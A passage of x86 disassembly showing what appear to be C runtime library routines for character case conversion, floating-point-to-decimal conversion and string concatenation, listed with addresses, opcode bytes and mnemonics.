00001F69  8D4D0A            lea ecx,[ebp+0xa]
00001F6C  6A01              push byte +0x1
00001F6E  6A00              push byte +0x0
00001F70  6A00              push byte +0x0
00001F72  51                push ecx
00001F73  50                push eax
00001F74  8D45FC            lea eax,[ebp-0x4]
00001F77  50                push eax
00001F78  6A01              push byte +0x1
00001F7A  E8D50B0000        call 0x2b54
00001F7F  83C41C            add esp,byte +0x1c
00001F82  85C0              test eax,eax
00001F84  7502              jnz 0x1f88
00001F86  C9                leave
00001F87  C3                ret
00001F88  0FB7450A          movzx eax,word [ebp+0xa]
00001F8C  23450C            and eax,[ebp+0xc]
00001F8F  C9                leave
00001F90  C3                ret
00001F91  53                push ebx
00001F92  33DB              xor ebx,ebx
00001F94  391DA46D1E00      cmp [0x1e6da4],ebx
00001F9A  7513              jnz 0x1faf
00001F9C  8B442408          mov eax,[esp+0x8]
00001FA0  83F841            cmp eax,byte +0x41
00001FA3  7C59              jl 0x1ffe
00001FA5  83F85A            cmp eax,byte +0x5a
00001FA8  7F54              jg 0x1ffe
00001FAA  83C020            add eax,byte +0x20
00001FAD  5B                pop ebx
00001FAE  C3                ret
00001FAF  56                push esi
00001FB0  BED4721E00        mov esi,0x1e72d4
00001FB5  57                push edi
00001FB6  56                push esi
00001FB7  FF159C561E00      call near [0x1e569c]
00001FBD  391DD0721E00      cmp [0x1e72d0],ebx
00001FC3  8B3D98561E00      mov edi,[0x1e5698]
00001FC9  740E              jz 0x1fd9
00001FCB  56                push esi
00001FCC  FFD7              call edi
00001FCE  6A13              push byte +0x13
00001FD0  E8C80C0000        call 0x2c9d
00001FD5  59                pop ecx
00001FD6  6A01              push byte +0x1
00001FD8  5B                pop ebx
00001FD9  FF742410          push dword [esp+0x10]
00001FDD  E81E000000        call 0x2000
00001FE2  85DB              test ebx,ebx
00001FE4  59                pop ecx
00001FE5  89442410          mov [esp+0x10],eax
00001FE9  740A              jz 0x1ff5
00001FEB  6A13              push byte +0x13
00001FED  E80C0D0000        call 0x2cfe
00001FF2  59                pop ecx
00001FF3  EB03              jmp short 0x1ff8
00001FF5  56                push esi
00001FF6  FFD7              call edi
00001FF8  8B442410          mov eax,[esp+0x10]
00001FFC  5F                pop edi
00001FFD  5E                pop esi
00001FFE  5B                pop ebx
00001FFF  C3                ret
00002000  55                push ebp
00002001  8BEC              mov ebp,esp
00002003  51                push ecx
00002004  833DA46D1E0000    cmp dword [0x1e6da4],byte +0x0
0000200B  53                push ebx
0000200C  56                push esi
0000200D  57                push edi
0000200E  751D              jnz 0x202d
00002010  8B4508            mov eax,[ebp+0x8]
00002013  83F841            cmp eax,byte +0x41
00002016  0F8CAA000000      jl near 0x20c6
0000201C  83F85A            cmp eax,byte +0x5a
0000201F  0F8FA1000000      jg near 0x20c6
00002025  83C020            add eax,byte +0x20
00002028  E999000000        jmp 0x20c6
0000202D  8B5D08            mov ebx,[ebp+0x8]
00002030  BF00010000        mov edi,0x100
00002035  6A01              push byte +0x1
00002037  3BDF              cmp ebx,edi
00002039  5E                pop esi
0000203A  7D25              jnl 0x2061
0000203C  39353C601E00      cmp [0x1e603c],esi
00002042  7E0B              jng 0x204f
00002044  56                push esi
00002045  53                push ebx
00002046  E8D1FEFFFF        call 0x1f1c
0000204B  59                pop ecx
0000204C  59                pop ecx
0000204D  EB0A              jmp short 0x2059
0000204F  A148601E00        mov eax,[0x1e6048]
00002054  8A0458            mov al,[eax+ebx*2]
00002057  23C6              and eax,esi
00002059  85C0              test eax,eax
0000205B  7504              jnz 0x2061
0000205D  8BC3              mov eax,ebx
0000205F  EB65              jmp short 0x20c6
00002061  8B1548601E00      mov edx,[0x1e6048]
00002067  8BC3              mov eax,ebx
00002069  C1F808            sar eax,0x8
0000206C  0FB6C8            movzx ecx,al
0000206F  F6444A0180        test byte [edx+ecx*2+0x1],0x80
00002074  740F              jz 0x2085
00002076  80650A00          and byte [ebp+0xa],0x0
0000207A  6A02              push byte +0x2
0000207C  884508            mov [ebp+0x8],al
0000207F  885D09            mov [ebp+0x9],bl
00002082  58                pop eax
00002083  EB09              jmp short 0x208e
00002085  80650900          and byte [ebp+0x9],0x0
00002089  885D08            mov [ebp+0x8],bl
0000208C  8BC6              mov eax,esi
0000208E  56                push esi
0000208F  6A00              push byte +0x0
00002091  8D4DFC            lea ecx,[ebp-0x4]
00002094  6A03              push byte +0x3
00002096  51                push ecx
00002097  50                push eax
00002098  8D4508            lea eax,[ebp+0x8]
0000209B  50                push eax
0000209C  57                push edi
0000209D  FF35A46D1E00      push dword [0x1e6da4]
000020A3  E86B0C0000        call 0x2d13
000020A8  83C420            add esp,byte +0x20
000020AB  85C0              test eax,eax
000020AD  74AE              jz 0x205d
000020AF  3BC6              cmp eax,esi
000020B1  7506              jnz 0x20b9
000020B3  0FB645FC          movzx eax,byte [ebp-0x4]
000020B7  EB0D              jmp short 0x20c6
000020B9  0FB645FD          movzx eax,byte [ebp-0x3]
000020BD  0FB64DFC          movzx ecx,byte [ebp-0x4]
000020C1  C1E008            shl eax,0x8
000020C4  0BC1              or eax,ecx
000020C6  5F                pop edi
000020C7  5E                pop esi
000020C8  5B                pop ebx
000020C9  C9                leave
000020CA  C3                ret
000020CB  8B442408          mov eax,[esp+0x8]
000020CF  56                push esi
000020D0  6A20              push byte +0x20
000020D2  99                cdq
000020D3  59                pop ecx
000020D4  F7F9              idiv ecx
000020D6  6A1F              push byte +0x1f
000020D8  8BF0              mov esi,eax
000020DA  8B442410          mov eax,[esp+0x10]
000020DE  99                cdq
000020DF  F7F9              idiv ecx
000020E1  59                pop ecx
000020E2  8B442408          mov eax,[esp+0x8]
000020E6  2BCA              sub ecx,edx
000020E8  83CAFF            or edx,byte -0x1
000020EB  D3E2              shl edx,cl
000020ED  F7D2              not edx
000020EF  8514B0            test [eax+esi*4],edx
000020F2  751C              jnz 0x2110
000020F4  46                inc esi
000020F5  83FE03            cmp esi,byte +0x3
000020F8  7D11              jnl 0x210b
000020FA  8D04B0            lea eax,[eax+esi*4]
000020FD  833800            cmp dword [eax],byte +0x0
00002100  750E              jnz 0x2110
00002102  46                inc esi
00002103  83C004            add eax,byte +0x4
00002106  83FE03            cmp esi,byte +0x3
00002109  7CF2              jl 0x20fd
0000210B  6A01              push byte +0x1
0000210D  58                pop eax
0000210E  5E                pop esi
0000210F  C3                ret
00002110  33C0              xor eax,eax
00002112  5E                pop esi
00002113  C3                ret
00002114  8B442408          mov eax,[esp+0x8]
00002118  53                push ebx
00002119  56                push esi
0000211A  57                push edi
0000211B  6A20              push byte +0x20
0000211D  8B5C2414          mov ebx,[esp+0x14]
00002121  99                cdq
00002122  59                pop ecx
00002123  F7F9              idiv ecx
00002125  8BF0              mov esi,eax
00002127  8B442414          mov eax,[esp+0x14]
0000212B  99                cdq
0000212C  F7F9              idiv ecx
0000212E  8D3CB3            lea edi,[ebx+esi*4]
00002131  57                push edi
00002132  6A1F              push byte +0x1f
00002134  59                pop ecx
00002135  6A01              push byte +0x1
00002137  58                pop eax
00002138  2BCA              sub ecx,edx
0000213A  D3E0              shl eax,cl
0000213C  50                push eax
0000213D  FF37              push dword [edi]
0000213F  E81E0E0000        call 0x2f62
00002144  83C40C            add esp,byte +0xc
00002147  4E                dec esi
00002148  781C              js 0x2166
0000214A  8D3CB3            lea edi,[ebx+esi*4]
0000214D  85C0              test eax,eax
0000214F  7415              jz 0x2166
00002151  57                push edi
00002152  6A01              push byte +0x1
00002154  FF37              push dword [edi]
00002156  E8070E0000        call 0x2f62
0000215B  83C40C            add esp,byte +0xc
0000215E  4E                dec esi
0000215F  83EF04            sub edi,byte +0x4
00002162  85F6              test esi,esi
00002164  7DE7              jnl 0x214d
00002166  5F                pop edi
00002167  5E                pop esi
00002168  5B                pop ebx
00002169  C3                ret
0000216A  55                push ebp
0000216B  8BEC              mov ebp,esp
0000216D  51                push ecx
0000216E  51                push ecx
0000216F  8B450C            mov eax,[ebp+0xc]
00002172  53                push ebx
00002173  56                push esi
00002174  57                push edi
00002175  8D78FF            lea edi,[eax-0x1]
00002178  6A20              push byte +0x20
0000217A  59                pop ecx
0000217B  8365FC00          and dword [ebp-0x4],byte +0x0
0000217F  8D5F01            lea ebx,[edi+0x1]
00002182  6A20              push byte +0x20
00002184  8BC3              mov eax,ebx
00002186  5E                pop esi
00002187  99                cdq
00002188  F7F9              idiv ecx
0000218A  6A1F              push byte +0x1f
0000218C  8BC8              mov ecx,eax
0000218E  8BC3              mov eax,ebx
00002190  99                cdq
00002191  F7FE              idiv esi
00002193  8B4508            mov eax,[ebp+0x8]
00002196  5E                pop esi
00002197  6A01              push byte +0x1
00002199  894DF8            mov [ebp-0x8],ecx
0000219C  8D0488            lea eax,[eax+ecx*4]
0000219F  89450C            mov [ebp+0xc],eax
000021A2  2BF2              sub esi,edx
000021A4  5A                pop edx
000021A5  8BCE              mov ecx,esi
000021A7  D3E2              shl edx,cl
000021A9  8510              test [eax],edx
000021AB  7421              jz 0x21ce
000021AD  43                inc ebx
000021AE  53                push ebx
000021AF  FF7508            push dword [ebp+0x8]
000021B2  E814FFFFFF        call 0x20cb
000021B7  59                pop ecx
000021B8  85C0              test eax,eax
000021BA  59                pop ecx
000021BB  750E              jnz 0x21cb
000021BD  57                push edi
000021BE  FF7508            push dword [ebp+0x8]
000021C1  E84EFFFFFF        call 0x2114
000021C6  59                pop ecx
000021C7  8945FC            mov [ebp-0x4],eax
000021CA  59                pop ecx
000021CB  8B450C            mov eax,[ebp+0xc]
000021CE  83CAFF            or edx,byte -0x1
000021D1  8BCE              mov ecx,esi
000021D3  D3E2              shl edx,cl
000021D5  6A03              push byte +0x3
000021D7  59                pop ecx
000021D8  2110              and [eax],edx
000021DA  8B45F8            mov eax,[ebp-0x8]
000021DD  40                inc eax
000021DE  3BC1              cmp eax,ecx
000021E0  7D0C              jnl 0x21ee
000021E2  8B5508            mov edx,[ebp+0x8]
000021E5  2BC8              sub ecx,eax
000021E7  8D3C82            lea edi,[edx+eax*4]
000021EA  33C0              xor eax,eax
000021EC  F3AB              rep stosd
000021EE  8B45FC            mov eax,[ebp-0x4]
000021F1  5F                pop edi
000021F2  5E                pop esi
000021F3  5B                pop ebx
000021F4  C9                leave
000021F5  C3                ret
000021F6  8B442408          mov eax,[esp+0x8]
000021FA  8B4C2404          mov ecx,[esp+0x4]
000021FE  56                push esi
000021FF  6A03              push byte +0x3
00002201  2BC8              sub ecx,eax
00002203  5A                pop edx
00002204  8B30              mov esi,[eax]
00002206  893401            mov [ecx+eax],esi
00002209  83C004            add eax,byte +0x4
0000220C  4A                dec edx
0000220D  75F5              jnz 0x2204
0000220F  5E                pop esi
00002210  C3                ret
00002211  57                push edi
00002212  8B7C2408          mov edi,[esp+0x8]
00002216  33C0              xor eax,eax
00002218  AB                stosd
00002219  AB                stosd
0000221A  AB                stosd
0000221B  5F                pop edi
0000221C  C3                ret
0000221D  8B442404          mov eax,[esp+0x4]
00002221  33C9              xor ecx,ecx
00002223  833800            cmp dword [eax],byte +0x0
00002226  750D              jnz 0x2235
00002228  41                inc ecx
00002229  83C004            add eax,byte +0x4
0000222C  83F903            cmp ecx,byte +0x3
0000222F  7CF2              jl 0x2223
00002231  6A01              push byte +0x1
00002233  58                pop eax
00002234  C3                ret
00002235  33C0              xor eax,eax
00002237  C3                ret
00002238  55                push ebp
00002239  8BEC              mov ebp,esp
0000223B  83EC0C            sub esp,byte +0xc
0000223E  8B450C            mov eax,[ebp+0xc]
00002241  53                push ebx
00002242  56                push esi
00002243  57                push edi
00002244  6A20              push byte +0x20
00002246  8B7D08            mov edi,[ebp+0x8]
00002249  5B                pop ebx
0000224A  83CEFF            or esi,byte -0x1
0000224D  99                cdq
0000224E  8BCB              mov ecx,ebx
00002250  C745FC03000000    mov dword [ebp-0x4],0x3
00002257  F7F9              idiv ecx
00002259  8945F4            mov [ebp-0xc],eax
0000225C  8B450C            mov eax,[ebp+0xc]
0000225F  99                cdq
00002260  F7F9              idiv ecx
00002262  83650C00          and dword [ebp+0xc],byte +0x0
00002266  8BCA              mov ecx,edx
00002268  D3E6              shl esi,cl
0000226A  2BDA              sub ebx,edx
0000226C  F7D6              not esi
0000226E  8B07              mov eax,[edi]
00002270  8BC8              mov ecx,eax
00002272  23CE              and ecx,esi
00002274  894DF8            mov [ebp-0x8],ecx
00002277  8BCA              mov ecx,edx
00002279  D3E8              shr eax,cl
0000227B  0B450C            or eax,[ebp+0xc]
0000227E  8907              mov [edi],eax
00002280  8B45F8            mov eax,[ebp-0x8]
00002283  8BCB              mov ecx,ebx
00002285  83C704            add edi,byte +0x4
00002288  D3E0              shl eax,cl
0000228A  FF4DFC            dec dword [ebp-0x4]
0000228D  89450C            mov [ebp+0xc],eax
00002290  75DC              jnz 0x226e
00002292  8B7DF4            mov edi,[ebp-0xc]
00002295  6A02              push byte +0x2
00002297  5B                pop ebx
00002298  8BF7              mov esi,edi
0000229A  6A08              push byte +0x8
0000229C  59                pop ecx
0000229D  C1E602            shl esi,0x2
000022A0  3BDF              cmp ebx,edi
000022A2  7C0F              jl 0x22b3
000022A4  8B5508            mov edx,[ebp+0x8]
000022A7  8BC1              mov eax,ecx
000022A9  2BC6              sub eax,esi
000022AB  8B0410            mov eax,[eax+edx]
000022AE  890411            mov [ecx+edx],eax
000022B1  EB07              jmp short 0x22ba
000022B3  8B4508            mov eax,[ebp+0x8]
000022B6  83240100          and dword [ecx+eax],byte +0x0
000022BA  4B                dec ebx
000022BB  83E904            sub ecx,byte +0x4
000022BE  79E0              jns 0x22a0
000022C0  5F                pop edi
000022C1  5E                pop esi
000022C2  5B                pop ebx
000022C3  C9                leave
000022C4  C3                ret
000022C5  55                push ebp
000022C6  8BEC              mov ebp,esp
000022C8  83EC18            sub esp,byte +0x18
000022CB  8B4508            mov eax,[ebp+0x8]
000022CE  53                push ebx
000022CF  56                push esi
000022D0  57                push edi
000022D1  0FB7480A          movzx ecx,word [eax+0xa]
000022D5  8BD9              mov ebx,ecx
000022D7  81E100800000      and ecx,0x8000
000022DD  894D08            mov [ebp+0x8],ecx
000022E0  8B4806            mov ecx,[eax+0x6]
000022E3  894DF4            mov [ebp-0xc],ecx
000022E6  8B4802            mov ecx,[eax+0x2]
000022E9  0FB700            movzx eax,word [eax]
000022EC  8B7D10            mov edi,[ebp+0x10]
000022EF  81E3FF7F0000      and ebx,0x7fff
000022F5  81EBFF3F0000      sub ebx,0x3fff
000022FB  894DF8            mov [ebp-0x8],ecx
000022FE  C1E010            shl eax,0x10
00002301  81FB01C0FFFF      cmp ebx,0xffffc001
00002307  8945FC            mov [ebp-0x4],eax
0000230A  7526              jnz 0x2332
0000230C  8D45F4            lea eax,[ebp-0xc]
0000230F  33F6              xor esi,esi
00002311  50                push eax
00002312  E806FFFFFF        call 0x221d
00002317  85C0              test eax,eax
00002319  59                pop ecx
0000231A  0F85D1000000      jnz near 0x23f1
00002320  8D45F4            lea eax,[ebp-0xc]
00002323  50                push eax
00002324  E8E8FEFFFF        call 0x2211
00002329  59                pop ecx
0000232A  6A02              push byte +0x2
0000232C  58                pop eax
0000232D  E9C1000000        jmp 0x23f3
00002332  8D45F4            lea eax,[ebp-0xc]
00002335  50                push eax
00002336  8D45E8            lea eax,[ebp-0x18]
00002339  50                push eax
0000233A  E8B7FEFFFF        call 0x21f6
0000233F  FF7708            push dword [edi+0x8]
00002342  8D45F4            lea eax,[ebp-0xc]
00002345  50                push eax
00002346  E81FFEFFFF        call 0x216a
0000234B  83C410            add esp,byte +0x10
0000234E  85C0              test eax,eax
00002350  7401              jz 0x2353
00002352  43                inc ebx
00002353  8B4704            mov eax,[edi+0x4]
00002356  8BC8              mov ecx,eax
00002358  2B4F08            sub ecx,[edi+0x8]
0000235B  3BD9              cmp ebx,ecx
0000235D  7D0C              jnl 0x236b
0000235F  8D45F4            lea eax,[ebp-0xc]
00002362  50                push eax
00002363  E8A9FEFFFF        call 0x2211
00002368  59                pop ecx
00002369  EB3C              jmp short 0x23a7
0000236B  3BD8              cmp ebx,eax
0000236D  7F3F              jg 0x23ae
0000236F  2BC3              sub eax,ebx
00002371  8BF0              mov esi,eax
00002373  8D45E8            lea eax,[ebp-0x18]
00002376  50                push eax
00002377  8D45F4            lea eax,[ebp-0xc]
0000237A  50                push eax
0000237B  E876FEFFFF        call 0x21f6
00002380  8D45F4            lea eax,[ebp-0xc]
00002383  56                push esi
00002384  50                push eax
00002385  E8AEFEFFFF        call 0x2238
0000238A  FF7708            push dword [edi+0x8]
0000238D  8D45F4            lea eax,[ebp-0xc]
00002390  50                push eax
00002391  E8D4FDFFFF        call 0x216a
00002396  8B470C            mov eax,[edi+0xc]
00002399  40                inc eax
0000239A  50                push eax
0000239B  8D45F4            lea eax,[ebp-0xc]
0000239E  50                push eax
0000239F  E894FEFFFF        call 0x2238
000023A4  83C420            add esp,byte +0x20
000023A7  33F6              xor esi,esi
000023A9  E97CFFFFFF        jmp 0x232a
000023AE  3B1F              cmp ebx,[edi]
000023B0  7C28              jl 0x23da
000023B2  8D45F4            lea eax,[ebp-0xc]
000023B5  50                push eax
000023B6  E856FEFFFF        call 0x2211
000023BB  FF770C            push dword [edi+0xc]
000023BE  804DF780          or byte [ebp-0x9],0x80
000023C2  8D45F4            lea eax,[ebp-0xc]
000023C5  50                push eax
000023C6  E86DFEFFFF        call 0x2238
000023CB  8B7714            mov esi,[edi+0x14]
000023CE  83C40C            add esp,byte +0xc
000023D1  0337              add esi,[edi]
000023D3  6A01              push byte +0x1
000023D5  E952FFFFFF        jmp 0x232c
000023DA  FF770C            push dword [edi+0xc]
000023DD  8B7714            mov esi,[edi+0x14]
000023E0  8065F77F          and byte [ebp-0x9],0x7f
000023E4  8D45F4            lea eax,[ebp-0xc]
000023E7  50                push eax
000023E8  03F3              add esi,ebx
000023EA  E849FEFFFF        call 0x2238
000023EF  59                pop ecx
000023F0  59                pop ecx
000023F1  33C0              xor eax,eax
000023F3  6A1F              push byte +0x1f
000023F5  59                pop ecx
000023F6  2B4F0C            sub ecx,[edi+0xc]
000023F9  8B7F10            mov edi,[edi+0x10]
000023FC  D3E6              shl esi,cl
000023FE  8B4D08            mov ecx,[ebp+0x8]
00002401  F7D9              neg ecx
00002403  1BC9              sbb ecx,ecx
00002405  81E100000080      and ecx,0x80000000
0000240B  0BF1              or esi,ecx
0000240D  0B75F4            or esi,[ebp-0xc]
00002410  83FF40            cmp edi,byte +0x40
00002413  750D              jnz 0x2422
00002415  8B4D0C            mov ecx,[ebp+0xc]
00002418  8B55F8            mov edx,[ebp-0x8]
0000241B  897104            mov [ecx+0x4],esi
0000241E  8911              mov [ecx],edx
00002420  EB0A              jmp short 0x242c
00002422  83FF20            cmp edi,byte +0x20
00002425  7505              jnz 0x242c
00002427  8B4D0C            mov ecx,[ebp+0xc]
0000242A  8931              mov [ecx],esi
0000242C  5F                pop edi
0000242D  5E                pop esi
0000242E  5B                pop ebx
0000242F  C9                leave
00002430  C3                ret
00002431  6858621E00        push dword 0x1e6258
00002436  FF74240C          push dword [esp+0xc]
0000243A  FF74240C          push dword [esp+0xc]
0000243E  E882FEFFFF        call 0x22c5
00002443  83C40C            add esp,byte +0xc
00002446  C3                ret
00002447  6870621E00        push dword 0x1e6270
0000244C  FF74240C          push dword [esp+0xc]
00002450  FF74240C          push dword [esp+0xc]
00002454  E86CFEFFFF        call 0x22c5
00002459  83C40C            add esp,byte +0xc
0000245C  C3                ret
0000245D  55                push ebp
0000245E  8BEC              mov ebp,esp
00002460  83EC0C            sub esp,byte +0xc
00002463  33C0              xor eax,eax
00002465  50                push eax
00002466  50                push eax
00002467  50                push eax
00002468  50                push eax
00002469  FF750C            push dword [ebp+0xc]
0000246C  8D450C            lea eax,[ebp+0xc]
0000246F  50                push eax
00002470  8D45F4            lea eax,[ebp-0xc]
00002473  50                push eax
00002474  E88A0C0000        call 0x3103
00002479  FF7508            push dword [ebp+0x8]
0000247C  8D45F4            lea eax,[ebp-0xc]
0000247F  50                push eax
00002480  E8ACFFFFFF        call 0x2431
00002485  83C424            add esp,byte +0x24
00002488  C9                leave
00002489  C3                ret
0000248A  55                push ebp
0000248B  8BEC              mov ebp,esp
0000248D  83EC0C            sub esp,byte +0xc
00002490  33C0              xor eax,eax
00002492  50                push eax
00002493  50                push eax
00002494  50                push eax
00002495  50                push eax
00002496  FF750C            push dword [ebp+0xc]
00002499  8D450C            lea eax,[ebp+0xc]
0000249C  50                push eax
0000249D  8D45F4            lea eax,[ebp-0xc]
000024A0  50                push eax
000024A1  E85D0C0000        call 0x3103
000024A6  FF7508            push dword [ebp+0x8]
000024A9  8D45F4            lea eax,[ebp-0xc]
000024AC  50                push eax
000024AD  E895FFFFFF        call 0x2447
000024B2  83C424            add esp,byte +0x24
000024B5  C9                leave
000024B6  C3                ret
000024B7  55                push ebp
000024B8  8BEC              mov ebp,esp
000024BA  8B5510            mov edx,[ebp+0x10]
000024BD  53                push ebx
000024BE  8B5D0C            mov ebx,[ebp+0xc]
000024C1  56                push esi
000024C2  8B7508            mov esi,[ebp+0x8]
000024C5  8B4A0C            mov ecx,[edx+0xc]
000024C8  57                push edi
000024C9  8D7E01            lea edi,[esi+0x1]
000024CC  C60630            mov byte [esi],0x30
000024CF  85DB              test ebx,ebx
000024D1  8BC7              mov eax,edi
000024D3  7E1F              jng 0x24f4
000024D5  895D08            mov [ebp+0x8],ebx
000024D8  33DB              xor ebx,ebx
000024DA  8A11              mov dl,[ecx]
000024DC  84D2              test dl,dl
000024DE  7406              jz 0x24e6
000024E0  0FBED2            movsx edx,dl
000024E3  41                inc ecx
000024E4  EB03              jmp short 0x24e9
000024E6  6A30              push byte +0x30
000024E8  5A                pop edx
000024E9  8810              mov [eax],dl
000024EB  40                inc eax
000024EC  FF4D08            dec dword [ebp+0x8]
000024EF  75E9              jnz 0x24da
000024F1  8B5510            mov edx,[ebp+0x10]
000024F4  802000            and byte [eax],0x0
000024F7  85DB              test ebx,ebx
000024F9  7C12              jl 0x250d
000024FB  803935            cmp byte [ecx],0x35
000024FE  7C0D              jl 0x250d
00002500  48                dec eax
00002501  803839            cmp byte [eax],0x39
00002504  7505              jnz 0x250b
00002506  C60030            mov byte [eax],0x30
00002509  EBF5              jmp short 0x2500
0000250B  FE00              inc byte [eax]
0000250D  803E31            cmp byte [esi],0x31
00002510  7505              jnz 0x2517
00002512  FF4204            inc dword [edx+0x4]
00002515  EB12              jmp short 0x2529
00002517  57                push edi
00002518  E8B3050000        call 0x2ad0
0000251D  40                inc eax
0000251E  50                push eax
0000251F  57                push edi
00002520  56                push esi
00002521  E86A020000        call 0x2790
00002526  83C410            add esp,byte +0x10
00002529  5F                pop edi
0000252A  5E                pop esi
0000252B  5B                pop ebx
0000252C  5D                pop ebp
0000252D  C3                ret
0000252E  55                push ebp
0000252F  8BEC              mov ebp,esp
00002531  83EC28            sub esp,byte +0x28
00002534  56                push esi
00002535  8D4508            lea eax,[ebp+0x8]
00002538  57                push edi
00002539  50                push eax
0000253A  8D45F4            lea eax,[ebp-0xc]
0000253D  50                push eax
0000253E  E847000000        call 0x258a
00002543  59                pop ecx
00002544  8D45D8            lea eax,[ebp-0x28]
00002547  59                pop ecx
00002548  8D75F4            lea esi,[ebp-0xc]
0000254B  50                push eax
0000254C  6A00              push byte +0x0
0000254E  6A11              push byte +0x11
00002550  83EC0C            sub esp,byte +0xc
00002553  8BFC              mov edi,esp
00002555  A5                movsd
00002556  A5                movsd
00002557  66A5              movsw
00002559  E876100000        call 0x35d4
0000255E  8B7510            mov esi,[ebp+0x10]
00002561  8B7D14            mov edi,[ebp+0x14]
00002564  894608            mov [esi+0x8],eax
00002567  0FBE45DA          movsx eax,byte [ebp-0x26]
0000256B  8906              mov [esi],eax
0000256D  0FBF45D8          movsx eax,word [ebp-0x28]
00002571  894604            mov [esi+0x4],eax
00002574  8D45DC            lea eax,[ebp-0x24]
00002577  50                push eax
00002578  57                push edi
00002579  E8C2000000        call 0x2640
0000257E  83C420            add esp,byte +0x20
00002581  897E0C            mov [esi+0xc],edi
00002584  8BC6              mov eax,esi
00002586  5F                pop edi
00002587  5E                pop esi
00002588  C9                leave
00002589  C3                ret
0000258A  55                push ebp
0000258B  8BEC              mov ebp,esp
0000258D  51                push ecx
0000258E  8B550C            mov edx,[ebp+0xc]
00002591  53                push ebx
00002592  56                push esi
00002593  57                push edi
00002594  668B4206          mov ax,[edx+0x6]
00002598  BFFF070000        mov edi,0x7ff
0000259D  8BC8              mov ecx,eax
0000259F  2500800000        and eax,0x8000
000025A4  C1E904            shr ecx,0x4
000025A7  23CF              and ecx,edi
000025A9  89450C            mov [ebp+0xc],eax
000025AC  8B4204            mov eax,[edx+0x4]
000025AF  8B12              mov edx,[edx]
000025B1  0FB7D9            movzx ebx,cx
000025B4  BE00000080        mov esi,0x80000000
000025B9  25FFFF0F00        and eax,0xfffff
000025BE  85DB              test ebx,ebx
000025C0  8975FC            mov [ebp-0x4],esi
000025C3  7413              jz 0x25d8
000025C5  3BDF              cmp ebx,edi
000025C7  7408              jz 0x25d1
000025C9  8DB9003C0000      lea edi,[ecx+0x3c00]
000025CF  EB28              jmp short 0x25f9
000025D1  BFFF7F0000        mov edi,0x7fff
000025D6  EB21              jmp short 0x25f9
000025D8  33DB              xor ebx,ebx
000025DA  3BC3              cmp eax,ebx
000025DC  7512              jnz 0x25f0
000025DE  3BD3              cmp edx,ebx
000025E0  750E              jnz 0x25f0
000025E2  8B4508            mov eax,[ebp+0x8]
000025E5  895804            mov [eax+0x4],ebx
000025E8  8918              mov [eax],ebx
000025EA  66895808          mov [eax+0x8],bx
000025EE  EB4B              jmp short 0x263b
000025F0  8DB9013C0000      lea edi,[ecx+0x3c01]
000025F6  895DFC            mov [ebp-0x4],ebx
000025F9  8BCA              mov ecx,edx
000025FB  C1E915            shr ecx,0x15
000025FE  C1E00B            shl eax,0xb
00002601  0BC8              or ecx,eax
00002603  8B4508            mov eax,[ebp+0x8]
00002606  0B4DFC            or ecx,[ebp-0x4]
00002609  C1E20B            shl edx,0xb
0000260C  894804            mov [eax+0x4],ecx
0000260F  8910              mov [eax],edx
00002611  85CE              test esi,ecx
00002613  751D              jnz 0x2632
00002615  8B10              mov edx,[eax]
00002617  03C9              add ecx,ecx
00002619  8BDA              mov ebx,edx
0000261B  C1EB1F            shr ebx,0x1f
0000261E  0BD9              or ebx,ecx
00002620  8D0C12            lea ecx,[edx+edx]
00002623  8908              mov [eax],ecx
00002625  895804            mov [eax+0x4],ebx
00002628  81C7FFFF0000      add edi,0xffff
0000262E  8BCB              mov ecx,ebx
00002630  EBDF              jmp short 0x2611
00002632  8B4D0C            mov ecx,[ebp+0xc]
00002635  0BCF              or ecx,edi
00002637  66894808          mov [eax+0x8],cx
0000263B  5F                pop edi
0000263C  5E                pop esi
0000263D  5B                pop ebx
0000263E  C9                leave
0000263F  C3                ret
00002640  57                push edi
00002641  8B7C2408          mov edi,[esp+0x8]
00002645  EB6A              jmp short 0x26b1
00002647  8DA42400000000    lea esp,[esp+0x0]
0000264E  8BFF              mov edi,edi
00002650  8B4C2404          mov ecx,[esp+0x4]
00002654  57                push edi
00002655  F7C103000000      test ecx,0x3
0000265B  740F              jz 0x266c
0000265D  8A01              mov al,[ecx]
0000265F  41                inc ecx
00002660  84C0              test al,al
00002662  743B              jz 0x269f
00002664  F7C103000000      test ecx,0x3
0000266A  75F1              jnz 0x265d
0000266C  8B01              mov eax,[ecx]
0000266E  BAFFFEFE7E        mov edx,0x7efefeff
00002673  03D0              add edx,eax
00002675  83F0FF            xor eax,byte -0x1
00002678  33C2              xor eax,edx
0000267A  83C104            add ecx,byte +0x4
0000267D  A900010181        test eax,0x81010100
00002682  74E8              jz 0x266c
00002684  8B41FC            mov eax,[ecx-0x4]
00002687  84C0              test al,al
00002689  7423              jz 0x26ae
0000268B  84E4              test ah,ah
0000268D  741A              jz 0x26a9
0000268F  A90000FF00        test eax,0xff0000
00002694  740E              jz 0x26a4
00002696  A9000000FF        test eax,0xff000000
0000269B  7402              jz 0x269f
0000269D  EBCD              jmp short 0x266c
0000269F  8D79FF            lea edi,[ecx-0x1]
000026A2  EB0D              jmp short 0x26b1
000026A4  8D79FE            lea edi,[ecx-0x2]
000026A7  EB08              jmp short 0x26b1
000026A9  8D79FD            lea edi,[ecx-0x3]
000026AC  EB03              jmp short 0x26b1
000026AE  8D79FC            lea edi,[ecx-0x4]
000026B1  8B4C240C          mov ecx,[esp+0xc]
000026B5  F7C103000000      test ecx,0x3
000026BB  7419              jz 0x26d6
000026BD  8A11              mov dl,[ecx]
000026BF  41                inc ecx
000026C0  84D2              test dl,dl
000026C2  7464              jz 0x2728
000026C4  8817              mov [edi],dl
000026C6  47                inc edi
000026C7  F7C103000000      test ecx,0x3
000026CD  75EE              jnz 0x26bd
000026CF  EB05              jmp short 0x26d6
000026D1  8917              mov [edi],edx
000026D3  83C704            add edi,byte +0x4
000026D6  BAFFFEFE7E        mov edx,0x7efefeff
000026DB  8B01              mov eax,[ecx]
000026DD  03D0              add edx,eax
000026DF  83F0FF            xor eax,byte -0x1
000026E2  33C2              xor eax,edx
000026E4  8B11              mov edx,[ecx]
000026E6  83C104            add ecx,byte +0x4
000026E9  A900010181        test eax,0x81010100
000026EE  74E1              jz 0x26d1
000026F0  84D2              test dl,dl
000026F2  7434              jz 0x2728
000026F4  84F6              test dh,dh
000026F6  7427              jz 0x271f
000026F8  F7C20000FF00      test edx,0xff0000
000026FE  7412              jz 0x2712
00002700  F7C2000000FF      test edx,0xff000000
00002706  7402              jz 0x270a
00002708  EBC7              jmp short 0x26d1
0000270A  8917              mov [edi],edx
0000270C  8B442408          mov eax,[esp+0x8]
00002710  5F                pop edi
00002711  C3                ret
00002712  668917            mov [edi],dx
